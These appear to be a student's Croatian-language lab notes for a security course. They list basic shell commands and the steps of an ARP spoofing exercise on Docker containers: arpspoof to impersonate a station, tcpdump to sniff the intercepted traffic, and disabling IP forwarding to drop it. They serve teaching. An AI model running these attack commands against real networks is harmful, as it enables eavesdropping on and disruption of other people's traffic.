# SRP Lab1

### Pomoćne komande

wsl - Windows Subsystem for Linux

pwd - pokazuje file path foldera u kojem se trenutno nalazimo

cd [ime foldera] - mijenja folder u kojem se nalazimo

mkdir [ime foldera] - stvara novi folder

dir - izlistava sadržaj foldera

uname - ime operativnog sustava

hostname - pokazuje gdje se trenutno nalazimo s terminalom

### ARP spoofing

git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22) - kloniranje repozitorija sa githuba u trenutni folder

./start.sh - pokretanje docker containera

./stop.sh - zaustavljanje dockera

docker ps - ispis pokrenutih containera

docker ps exec -it sh - pokretanje interaktivnog shella u station-1

ipconfig -a - ispis ip i ethernet adresa

ping station-2 - pingamo ovaj container kao dokaz da je na istoj mreži kao station-1

netcat -l -p 9000 - na containeru station-1 pomoću netcata otvaramo TCP na portu 9000

netcat station-2 9000 - veza između 2 stationa, "sluša" na portu 9000, narušavanje integriteta

tcpdump - "sluša" na ethernetu

arpspoof - alat za spoofanje (-t target, -r host)

arpspoof -t station-1 station-2 - varamo station-1, predstavljamo se kao station-2, ovo radi evil-station, preko tcpdump sada vidimo promet, narušena povjerljivost

tcpdump -X host station-1 and not arp - filter prometa

echo 0 > /proc/sys/net/ipv4/ip_forward - naredba evil-station-u da ne prosljeđuje poruke nakon presretanja, narušena dostupnost